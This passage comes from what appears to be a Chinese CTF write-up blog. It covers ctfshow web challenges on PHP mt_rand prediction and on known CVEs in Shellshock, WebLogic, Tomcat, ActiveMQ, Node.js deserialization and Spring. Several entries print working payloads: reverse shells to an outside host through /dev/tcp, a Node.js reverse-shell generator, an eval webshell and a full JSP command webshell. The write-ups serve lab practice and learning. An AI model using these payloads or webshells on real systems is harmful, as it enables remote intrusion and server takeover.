<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php \$flag=&quot;</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-string">&quot;?&gt;&quot;</span>;<br></code></pre></td></tr></table></figure>


<p>返回一个随机数，并加上.php后缀,赋给<code>$filename</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;.php&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>写入文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure>


<p>以随机数生成器生成的第二个随机数重新生成新的随机数生成器</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br></code></pre></td></tr></table></figure>


<p>POST传参,令参数key与新的随机数生成器生成的随机数相等,即可进入IF判断</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] == <span class="hljs-title function_ invoke__">mt_rand</span>())<br></code></pre></td></tr></table></figure>


<p>生成第二个随机数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>($&#123;<span class="hljs-variable">$_POST</span>[<span class="hljs-title function_ invoke__">mt_rand</span>()]&#125;);<br></code></pre></td></tr></table></figure>


<p>本地构写几个mt_rand()结果,源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-string">&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;</span>,<span class="hljs-number">17</span>,<span class="hljs-number">7</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>运行结果如下，可以看到结果是固定的，这就是php的伪随机数问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-number">1160121479</span>&lt;/br&gt;<br><span class="hljs-number">954576979</span>&lt;/br&gt;<br><span class="hljs-number">1277894509</span>&lt;/br&gt;<br></code></pre></td></tr></table></figure>

<p>POST传参，参数名为新的随机数生成器生成的第二个随机数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>($&#123;<span class="hljs-variable">$_POST</span>[<span class="hljs-title function_ invoke__">mt_rand</span>()]&#125;);<br></code></pre></td></tr></table></figure>


<p>最后POST传：key&#x3D;954576979&amp;1277894509&#x3D;filename</p>
<p>因为<code>$_POST[mt_rand()]</code>前还有一个<code>$</code>,所以传入的<code>filename</code>会变成<code>$filename</code>,这样就读到了flag</p>
]]></content>
      <categories>
        <category>ctfshow-web入门</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>wp</tag>
        <tag>web入门</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web入门-组件漏洞</title>
    <url>/ctfshow/web%E5%85%A5%E9%97%A8/%E3%80%90ctfshow%E3%80%91web%E5%85%A5%E9%97%A8-%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<blockquote>
<p>WEB580–WEB599</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2jg9ED.png"></p>
<h1 id="WEB580"><a href="#WEB580" class="headerlink" title="WEB580"></a>WEB580</h1><p>根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）<br>这一题试了很多种payload，除了能看&#x2F;etc&#x2F;passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）<br>payload：<br><code>() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/cn1.utools.club/37634 0&gt;&amp;1;</code><br>发送如下数据包</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /cgi-bin/index.cgi HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">7</span>f35523e-<span class="hljs-number">4939</span>-<span class="hljs-number">43</span>d8-<span class="hljs-number">8</span>a05-f6348618a843.challenge.ctf.show:<span class="hljs-number">8080</span><br><span class="hljs-attribute">Pragma</span>: no-cache<br><span class="hljs-attribute">Cache</span>-Control: no-cache<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">lewiserii</span>: () &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/cn1.utools.club/<span class="hljs-number">37634</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>;<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">91</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4472</span>.<span class="hljs-number">106</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">7</span>f35523e-<span class="hljs-number">4939</span>-<span class="hljs-number">43</span>d8-<span class="hljs-number">8</span>a05-f6348618a843.challenge.ctf.show:<span class="hljs-number">8080</span>/cgi-bin/victim.cgi<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: UM_distinctid=<span class="hljs-number">179</span>eb628608d03-<span class="hljs-number">066</span>c8283766a21-f7f1939-<span class="hljs-number">1</span>bcab9-<span class="hljs-number">179</span>eb62860986d<br><span class="hljs-attribute">Connection</span>: close<br><br></code></pre></td></tr></table></figure>
<p>拿到shell<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2jgSHO.png"></p>
<h1 id="WEB581"><a href="#WEB581" class="headerlink" title="WEB581"></a>WEB581</h1><p>具体可以参考<a href="https://paper.seebug.org/334/">CVE-2017-6920</a><br>payload：</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">content=!php/object O:3:&quot;log&quot;:2:&#123;s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;s:7:&quot;content&quot;;s:24:&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;&#125;</span><br></code></pre></td></tr></table></figure>

<p>只要带上!php&#x2F;object  后面就会进行反序列化<br>写入文件后访问<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2jczDK.png"></p>
<h1 id="WEB582"><a href="#WEB582" class="headerlink" title="WEB582"></a>WEB582</h1><p>nodejsshell.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot;</span> % (sys.argv[<span class="hljs-number">0</span>])<br>    sys.exit(<span class="hljs-number">0</span>)<br><br>IP_ADDR = sys.argv[<span class="hljs-number">1</span>]<br>PORT = sys.argv[<span class="hljs-number">2</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">charencode</span>(<span class="hljs-params">string</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;String.CharCode&quot;&quot;&quot;</span><br>    encoded = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> string:<br>        encoded = encoded + <span class="hljs-string">&quot;,&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(char))<br>    <span class="hljs-keyword">return</span> encoded[<span class="hljs-number">1</span>:]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] LHOST = %s&quot;</span> % (IP_ADDR)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] LPORT = %s&quot;</span> % (PORT)<br>NODEJS_REV_SHELL = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">var net = require(&#x27;net&#x27;);</span><br><span class="hljs-string">var spawn = require(&#x27;child_process&#x27;).spawn;</span><br><span class="hljs-string">HOST=&quot;%s&quot;;</span><br><span class="hljs-string">PORT=&quot;%s&quot;;</span><br><span class="hljs-string">TIMEOUT=&quot;5000&quot;;</span><br><span class="hljs-string">if (typeof String.prototype.contains === &#x27;undefined&#x27;) &#123; String.prototype.contains = function(it) &#123; return this.indexOf(it) != -1; &#125;; &#125;</span><br><span class="hljs-string">function c(HOST,PORT) &#123;</span><br><span class="hljs-string">    var client = new net.Socket();</span><br><span class="hljs-string">    client.connect(PORT, HOST, function() &#123;</span><br><span class="hljs-string">        var sh = spawn(&#x27;/bin/sh&#x27;,[]);</span><br><span class="hljs-string">        client.write(&quot;Connected!\\n&quot;);</span><br><span class="hljs-string">        client.pipe(sh.stdin);</span><br><span class="hljs-string">        sh.stdout.pipe(client);</span><br><span class="hljs-string">        sh.stderr.pipe(client);</span><br><span class="hljs-string">        sh.on(&#x27;exit&#x27;,function(code,signal)&#123;</span><br><span class="hljs-string">          client.end(&quot;Disconnected!\\n&quot;);</span><br><span class="hljs-string">        &#125;);</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">    client.on(&#x27;error&#x27;, function(e) &#123;</span><br><span class="hljs-string">        setTimeout(c(HOST,PORT), TIMEOUT);</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">c(HOST,PORT);</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> % (IP_ADDR, PORT)<br><br><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Encoding&quot;</span><br>PAYLOAD = charencode(NODEJS_REV_SHELL)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;eval(String.fromCharCode(%s))&quot;</span> % (PAYLOAD)<br></code></pre></td></tr></table></figure>
<p>通过nodejsshell.py生成payload<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2j7xKg.png"><br>放入<code>&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function ()&#123;生成的payload&#125;()&quot;,&quot;password&quot;:123&#125;</code>,然后base64编码加url编码<br>bp抓包，构造一个user并传入payload<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2jqIrF.png"><br>成功反弹shell<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2jq5KU.png"></p>
<h1 id="WEB583"><a href="#WEB583" class="headerlink" title="WEB583"></a>WEB583</h1><p>CVE-2016-10033<br>在github上找到了<a href="https://github.com/opsxcq/exploit-CVE-2016-10033">exp</a><br>直接打就行了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2vpd8H.png"></p>
<p>但是这里有个地方要注意<br>现在（6.17）github上的exp是打不通的<br>我把这个和以前在github上下的版本用beyond比对了一下<br>！ 竟然不一样，如果你用官网的打不通可以试试我这个<a href="https://pan.baidu.com/s/1PHYAEyRyubLVZw8cc-iscg">版本</a>,提取码是f3rw<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2vQT54.png"></p>
<h1 id="WEB584"><a href="#WEB584" class="headerlink" title="WEB584"></a>WEB584</h1><p>生成数字exp(将echo后的内容替换成你自己的反弹一句话)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9jbjEudXRvb2xzLmNsdWIvNDUyMTQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br>bytecode = <span class="hljs-string">&#x27;,&#x27;</span>.join(<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(payload))<br><span class="hljs-built_in">print</span>(bytecode)<br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><code class="hljs haxe">[&#123; <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-type"></span>&quot;replace<span class="hljs-string">&quot;, &quot;</span>path<span class="hljs-string">&quot;: &quot;</span>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-type">java</span>.lang.<span class="hljs-keyword">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[]&#123;生成的数字&#125;))/lastname<span class="hljs-string">&quot;, &quot;</span>value<span class="hljs-string">&quot;: &quot;</span>ctfshow<span class="hljs-string">&quot; &#125;]</span><br></code></pre></td></tr></table></figure>
<p>首先post &#x2F;api&#x2F;people新建一个用户,获取到id<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2v1vND.png"></p>
<p>然后通过PATCH &#x2F;api&#x2F;people&#x2F;1，可以rce反弹shell<br><strong>注意Content-Type的格式</strong></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2v34qP.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2v3hrt.png"></p>
<h1 id="WEB585"><a href="#WEB585" class="headerlink" title="WEB585"></a>WEB585</h1><p>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）<br>直接抓包传即可，但是要注意tomcat对文件后缀有一定验证，（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用&#x2F;）来绕过限制。<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2vBIZ4.png"></p>
<p>拿到shell<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2vB4LF.png"></p>
<p>jsp小马（pwd&#x3D;023）</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,java.io.*&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br>&lt;%!<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">excuteCmd</span><span class="hljs-params">(String c)</span><br>&#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><span class="hljs-keyword">try</span><br>&#123;<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">pro</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(c);<br>    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(pro.getInputStream()));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">while</span> ((temp = buf.readLine()) != <span class="hljs-literal">null</span>)<br>    &#123;<br>        line.append(temp+<span class="hljs-string">&quot;\\n&quot;</span>);<br>    &#125;<br>    buf.close();<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception e)<br>&#123;<br>    line.append(e.getMessage());<br>&#125;<br><span class="hljs-keyword">return</span> line.toString();<br>&#125;<br>%&gt;<br>&lt;%<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;023&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>))&amp;&amp;!<span class="hljs-string">&quot;&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)))<br>&#123;<br>    out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>+excuteCmd(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))+<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    out.println(<span class="hljs-string">&quot;:-)&quot;</span>);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure>

<h1 id="WEB586"><a href="#WEB586" class="headerlink" title="WEB586"></a>WEB586</h1><p>wordpress环境，首先尝试弱口令，进不去，只好创建一个用户进行测试<br>发现里面有一篇文章介绍了这个插件漏洞<br>使用百度，发现对于下面这个地址的id参数（post）存在sql注入，因为没有过滤直接带入了sql语句，所以造成了sql注入<br>IP&#x2F;wp-admin&#x2F;admin-ajax.php?action&#x3D;populate_download_edit_form</p>
<p>我用sqlmap跑出来了，也可以手注（使用load_file读文件）<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2vyt0S.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2v6PHS.png"></p>
<h1 id="WEB587"><a href="#WEB587" class="headerlink" title="WEB587"></a>WEB587</h1><p>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）<br>漏洞使用了XMLDecoder来解析用户传入的XML数据，但在在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
<p>发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2vgSw8.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2vczef.png"><br>POC</p>
<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wls-wsat/CoordinatorPortType</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>e40b731a-4abf-4e0b-acaf-c03997996db7.challenge.ctf.show:8080<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://e40b731a-4abf-4e0b-acaf-c03997996db7.challenge.ctf.show:8080/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=179eb628608d03-066c8283766a21-f7f1939-1bcab9-179eb62860986d<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>641<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">work:WorkContext</span> <span class="hljs-attr">xmlns:work</span>=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.4.0&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/bin/bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>bash -i <span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span> /dev/tcp/cn1.utools.club/45214 0<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">work:WorkContext</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>/&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<h1 id="WEB588"><a href="#WEB588" class="headerlink" title="WEB588"></a>WEB588</h1><p>吐槽一下：这一题的环境生成的好慢，我还以为环境坏了</p>
<p>Weblogic 任意文件上传漏洞（CVE-2018-2894）<br>利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。</p>
<p>访问IP&#x2F;ws_utc&#x2F;config.do，如果进入时不是设置页面而是登陆页面可以刷新一下多试几次</p>
<p>设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。我将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p>
<p>然后点击安全 -&gt; 增加，然后上传webshell并找到这个文件的时间戳（可以抓包或F12查看）：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2vL8c6.png"></p>
<p>然后访问IP&#x2F;ws_utc&#x2F;css&#x2F;config&#x2F;keystore&#x2F;[时间戳]_[文件名]，即可执行webshell(flag在环境变量里)：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2vOdqU.png"></p>
<h1 id="WEB589"><a href="#WEB589" class="headerlink" title="WEB589"></a>WEB589</h1><p>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</p>
<p>首先访问IP&#x2F;admin&#x2F;test&#x2F;systemProperties.jsp，查看ActiveMQ的绝对路径(账号密码为admin弱口令)：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2vx061.png"></p>
<p>然后PUT方法上传webshell：<br>上传成功后可以访问看一下，发现代码直接显示了，那么就表示没有解析，需要换个目录<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2xSxoT.png"></p>
<p>使用MOVE方法移动到web目录下的api文件夹（&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jsp）中：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2xpSFU.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2xSvwV.png"></p>
<h1 id="WEB590"><a href="#WEB590" class="headerlink" title="WEB590"></a>WEB590</h1><p>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p>
<p>使用<a href="https://github.com/vulhub/Apereo-CAS-Attack/releases">Apereo-CAS-Attack</a>来生成POC<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2xPjc4.png"><br>然后我们登录CAS并抓包，将Body中的execution值替换成上面生成的Payload发送<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2xPbNV.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2xPHA0.png"></p>
<h1 id="WEB591"><a href="#WEB591" class="headerlink" title="WEB591"></a>WEB591</h1><p>591后面都是福利题了，嘿嘿<br>Apache HTTPD 换行解析漏洞（CVE-2017-15715）<br>在1.php后面插入一个\x0A（注意，不能是\x0D\x0A，只能是一个\x0A）<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2xmq4s.png"><br>访问刚才上传的&#x2F;1.php%0a，发现能够成功解析<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2xmbNj.png"></p>
<h1 id="WEB592"><a href="#WEB592" class="headerlink" title="WEB592"></a>WEB592</h1><p>Apache HTTPD 多后缀解析漏洞</p>
<p>上传的文件中只要包含.php都能被解析<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2xQkdO.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2xQAoD.png"></p>
<h1 id="WEB593"><a href="#WEB593" class="headerlink" title="WEB593"></a>WEB593</h1><p>Apache SSI 远程命令执行漏洞<br>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p>
<p>上传一个shtml文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2x1IRH.png" alt="2x1IRH.png"><br>访问生成的文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2x15Je.png" alt="2x15Je.png"></p>
